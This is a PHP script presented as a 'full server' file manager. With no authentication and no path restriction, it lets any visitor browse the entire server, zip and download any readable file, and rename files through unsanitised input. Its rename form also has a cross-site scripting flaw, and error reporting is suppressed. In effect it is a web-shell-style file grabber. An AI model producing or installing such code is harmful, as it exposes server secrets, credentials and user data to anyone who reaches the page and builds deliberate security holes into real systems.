<?php
/*
 Full Server PHP File Manager
 Features:
 1) Navigate anywhere on server (no root restriction)
 2) List files/folders
 3) Select multiple / Select All
 4) Instant Zip & Download
 5) Rename files/folders
 6) Access denied handling
*/

error_reporting(0);
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path) $path = getcwd();

// Handle rename
if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $old = $path . DIRECTORY_SEPARATOR . $_POST['rename_old'];
    $new = $path . DIRECTORY_SEPARATOR . $_POST['rename_new'];
    if (file_exists($old) && is_writable(dirname($old))) {
        rename($old, $new);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Handle zip download
if (isset($_POST['files']) && count($_POST['files']) > 0) {
    $zipname = "download_" . time() . ".zip";
    $zip = new ZipArchive();
    $zip->open($zipname, ZipArchive::CREATE | ZipArchive::OVERWRITE);

    foreach ($_POST['files'] as $file) {
        $fullPath = $path . DIRECTORY_SEPARATOR . $file;
        if (is_readable($fullPath)) {
            if (is_file($fullPath)) {
                $zip->addFile($fullPath, $file);
            } elseif (is_dir($fullPath)) {
                $iterator = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($fullPath, RecursiveDirectoryIterator::SKIP_DOTS)
                );
                foreach ($iterator as $item) {
                    if (is_readable($item)) {
                        $zip->addFile($item, $file . '/' . substr($item, strlen($fullPath) + 1));
                    }
                }
            }
        }
    }
    $zip->close();

    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="' . basename($zipname) . '"');
    header('Content-Length: ' . filesize($zipname));
    readfile($zipname);
    unlink($zipname);
    exit;
}

// List directory contents safely
$items = @scandir($path);
if ($items === false) $items = [];

function breadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $crumbs = [];
    $build = "";
    foreach ($parts as $part) {
        if ($part === '') {
            $build = DIRECTORY_SEPARATOR;
            $crumbs[] = "<a href='?path=" . urlencode($build) . "'>/</a>";
            continue;
        }
        if ($build !== DIRECTORY_SEPARATOR) $build .= DIRECTORY_SEPARATOR;
        $build .= $part;
        $crumbs[] = "<a href='?path=" . urlencode($build) . "'>" . htmlspecialchars($part) . "</a>";
    }
    return implode(" / ", $crumbs);
}
?>
<!DOCTYPE html>
<html>
<head>
<title>PHP File Manager</title>
<style>
    body { font-family: Arial; margin: 20px; }
    table { border-collapse: collapse; width: 100%; }
    th, td { border: 1px solid #ccc; padding: 8px; }
    th { background: #f0f0f0; }
    a { text-decoration: none; }
</style>
<script>
function toggleSelectAll(source) {
    let checkboxes = document.getElementsByName('files[]');
    for (let i = 0; i < checkboxes.length; i++)
        checkboxes[i].checked = source.checked;
}
function renameItem(name) {
    let newName = prompt("Rename to:", name);
    if (newName && newName !== name) {
        let form = document.createElement('form');
        form.method = 'POST';
        form.innerHTML = `<input name="rename_old" value="${name}">
                          <input name="rename_new" value="${newName}">`;
        document.body.appendChild(form);
        form.submit();
    }
}
</script>
</head>
<body>

<h2>PHP File Manager</h2>
<p><b>Current Path:</b> <?php echo breadcrumb($path); ?></p>

<form method="POST">
<table>
<tr>
    <th><input type="checkbox" onclick="toggleSelectAll(this)"></th>
    <th>Name</th>
    <th>Type</th>
    <th>Action</th>
</tr>
<?php
if ($path !== DIRECTORY_SEPARATOR) {
    echo "<tr><td></td><td><a href='?path=" . urlencode(dirname($path)) . "'>⬅ Back</a></td><td>Folder</td><td></td></tr>";
}
foreach ($items as $item) {
    if ($item === "." || $item === "..") continue;
    $full = $path . DIRECTORY_SEPARATOR . $item;
    echo "<tr>";
    echo "<td><input type='checkbox' name='files[]' value='" . htmlspecialchars($item) . "'></td>";
    if (is_dir($full)) {
        echo "<td><a href='?path=" . urlencode($full) . "'>" . htmlspecialchars($item) . "</a></td>";
        echo "<td>Folder</td>";
    } else {
        echo "<td>" . htmlspecialchars($item) . "</td>";
        echo "<td>File</td>";
    }
    echo "<td><button type='button' onclick='renameItem(\"" . htmlspecialchars($item) . "\")'>Rename</button></td>";
    echo "</tr>";
}
?>
</table>
<br>
<button type="submit">Download as ZIP</button>
</form>

</body>
</html>